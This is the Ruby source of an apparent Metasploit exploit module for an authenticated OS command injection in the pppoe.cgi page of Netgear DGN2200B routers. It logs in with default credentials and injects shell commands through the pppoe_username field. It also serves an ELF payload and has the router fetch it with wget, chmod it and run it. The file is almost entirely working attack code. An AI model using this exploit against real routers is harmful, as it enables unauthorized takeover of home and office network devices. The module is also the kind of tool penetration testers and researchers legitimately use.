# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Netgear DGN2200B pppoe.cgi Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
          Some Netgear Routers are vulnerable to an authenticated OS command injection
        on their web interface. Default credentials for the web interface are admin/admin
        or admin/password. Since it is a blind os command injection vulnerability, there
        is no output for the executed command when using the cmd generic payload. A ping
        command against a controlled system could be used for testing purposes. This module
        overwrites parts of the PPOE configuration, while the module tries to restore it
        after exploitation configuration backup is recommended.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;BID&#039;, &#039;57998&#039; ],
          [ &#039;EDB&#039;, &#039;24513&#039; ],
          [ &#039;OSVDB&#039;, &#039;90320&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-015&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 15 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;,&#039;unix&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mipsbe Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSBE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1,
      ))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039; ]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, &#039;password&#039; ]),
        OptAddress.new(&#039;DOWNHOST&#039;, [ false, &#039;An alternative host to request the MIPS payload from&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 60]),
        OptInt.new(&#039;RELOAD_CONF_DELAY&#039;, [true, &#039;Time to wait to allow the remote device to load configuration&#039;, 45])
      ], self.class)
  end

  def get_config(config, pattern)
    if config =~ /#{pattern}/
      #puts "[*] #{$1}"  #debugging
      return $1
    end
    return ""
  end

  def grab_config(user,pass)
    print_status("#{rhost}:#{rport} - Trying to download the original configuration")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/BAS_pppoe.htm&#039;,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        if res.body =~ /pppoe_username/
          print_good("#{rhost}:#{rport} - Successfully downloaded the configuration")
        else
          fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - Download of the original configuration not possible or the device uses a configuration which is not supported")
        end
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    @pppoe_username_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"text\"\ name=\"pppoe_username\"\ size=\"15\"\ maxlength=\"63\"\ value=\"(.*)\"><\/td")
    @pppoe_passwd_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"password\"\ name=\"pppoe_passwd\"\ size=\"15\"\ maxlength=\"63\"\ value=\"(.*)\"><\/td")
    @pppoe_servicename_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"text\"\ name=\"pppoe_servicename\"\ maxlength=\"63\"\ size=\"15\"\ value=\"(.*)\"><\/td")

    @runtest_orig = get_config(res.body, "<input\ type=\"hidden\"\ name=\"runtest\"\ value=\"(.*)\">")
    @wan_ipaddr_orig = get_config(res.body, "<INPUT\ name=wan_ipaddr\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_localip_orig = get_config(res.body, "<INPUT\ name=pppoe_localip\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns_sel_orig = get_config(res.body, "<INPUT\ name=wan_dns_sel\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns1_pri_orig = get_config(res.body, "<INPUT\ name=wan_dns1_pri\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns1_sec_orig = get_config(res.body, "<INPUT\ name=wan_dns1_sec\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_sel_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_sel\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_def_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_def\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr2_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr2\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_pc_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_pc\ type=hidden\ value=\ \"(.*)\">")
    @wan_nat_orig = get_config(res.body, "<INPUT\ name=wan_nat\ type=hidden\ value=\ \"(.*)\">")
    @opendns_parental_ctrl_orig = get_config(res.body, "<INPUT\ name=opendns_parental_ctrl\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_flet_sel_orig = get_config(res.body, "<INPUT\ name=pppoe_flet_sel\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_flet_type_orig = get_config(res.body, "<INPUT\ name=pppoe_flet_type\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_temp_orig = get_config(res.body, "<INPUT\ name=pppoe_temp\ type=hidden\ value=\ \"(.*)\">")
    @apply_orig = get_config(res.body, "<input\ type=\"SUBMIT\"\ name=\"apply\"\ value=(.*)\ onClick=\"return\ checkData\(\)\">")
  end

  def restore_conf(user,pass,uri)
    # we have used most parts of the original configuration
    # just need to restore pppoe_username
    cmd = @pppoe_username_orig
    print_status("#{rhost}:#{rport} - Asking the Netgear device to reload original configuration")

    res = request(cmd,user,pass,uri)

    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to reload original configuration")
    end

    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)
  end

  def request(cmd,user,pass,uri)
    begin

    #original post request
    #login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20COMMAND%20%26
    #&pppoe_passwd=69cw20hb&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5
    #&WANAssign=Dynamic&DNSAssign=0&en_nat=1&MACAssign=0&apply=%C3%9Cbernehmen
    #&runtest=yes&wan_ipaddr=0.0.0.0&pppoe_localip=0.0.0.0&wan_dns_sel=0
    #&wan_dns1_pri=0.0.0.0&wan_dns1_sec=...&wan_hwaddr_sel=0
    #&wan_hwaddr_def=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr2=84%3A1B%3A5E%3A01%3AE7%3A05
    #&wan_hwaddr_pc=5C%3A26%3A0A%3A2B%3AF0%3A3F&wan_nat=1&opendns_parental_ctrl=0
    #&pppoe_flet_sel=&pppoe_flet_type=&pppoe_temp=&opendns_parental_ctrl=0
      res = send_request_cgi(
        {
          &#039;uri&#039;  => uri,
          &#039;method&#039; => &#039;POST&#039;,
          &#039;authorization&#039; => basic_auth(user,pass),
          &#039;encode_params&#039; => false,
          &#039;vars_post&#039; => {
            "login_type" => "PPPoE%28PPP+over+Ethernet%29",#default must be ok
            "pppoe_username" => cmd,
            "pppoe_passwd" => @pppoe_passwd_orig,
            "pppoe_servicename" => @pppoe_servicename_orig,
            "pppoe_dod" => "1",    #default must be ok
            "pppoe_idletime" => "5",  #default must be ok
            "WANAssign" => "Dynamic",  #default must be ok
            "DNSAssign" => "0",    #default must be ok
            "en_nat" => "1",    #default must be ok
            "MACAssign" => "0",    #default must be ok
            "apply" => @apply_orig,
            "runtest" => @runtest_orig,
            "wan_ipaddr" => @wan_ipaddr_orig,
            "pppoe_localip" => @pppoe_localip_orig,
            "wan_dns_sel" => @wan_dns_sel_orig,
            "wan_dns1_pri" => @wan_dns1_pri_orig,
            "wan_dns1_sec" => @wan_dns1_sec_orig,
            "wan_hwaddr_sel" => @wan_hwaddr_sel_orig,
            "wan_hwaddr_def" => @wan_hwaddr_def_orig,
            "wan_hwaddr2" => @wan_hwaddr2_orig,
            "wan_hwaddr_pc" => @wan_hwaddr_pc_orig,
            "wan_nat" => @wan_nat_orig,
            "opendns_parental_ctrl" => @opendns_parental_ctrl_orig,
            "pppoe_flet_sel" => @pppoe_flet_sel_orig,
            "pppoe_flet_type" => @pppoe_flet_type_orig,
            "pppoe_temp" => @pppoe_temp_orig,
            "opendns_parental_ctrl" => @opendns_parental_ctrl_orig
          }
        })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def logout(user,pass)
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/LGO_logout.htm&#039;,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful logout possible")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

  end

  def exploit
    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(8))
    uri = &#039;/pppoe.cgi&#039;
    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    @timeout = datastore[&#039;RELOAD_CONF_DELAY&#039;]

    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        &#039;uri&#039;     => &#039;/&#039;,
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    grab_config(user,pass)

    if target.name =~ /CMD/
      if not (datastore[&#039;CMD&#039;])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      cmd = "%26%20#{cmd}%20%26"
      res = request(cmd,user,pass,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = &#039;/&#039; + downfile

    if (datastore[&#039;DOWNHOST&#039;])
      service_url = &#039;http://&#039; + datastore[&#039;DOWNHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
    else
      #do not use SSL
      if datastore[&#039;SSL&#039;]
        ssl_restore = true
        datastore[&#039;SSL&#039;] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore[&#039;SRVHOST&#039;]
      end

      service_url = &#039;http://&#039; + srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
      }})

      datastore[&#039;SSL&#039;] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Netgear device to download and execute #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)

    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename};chmod 777 /tmp/#{filename};/tmp/#{filename}"
    cmd = Rex::Text.uri_encode(cmd)
    cmd = "%26%20#{cmd}%20%26"
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;HTTP_DELAY&#039;]} seconds to the Netgear device to download the payload")
      select(nil, nil, nil, datastore[&#039;HTTP_DELAY&#039;])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

    #
    #reload original configuration
    #
    restore_conf(user,pass,uri)

    #
    #lockout of the device and free the management sessions
    #
    logout(user,pass)
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

end

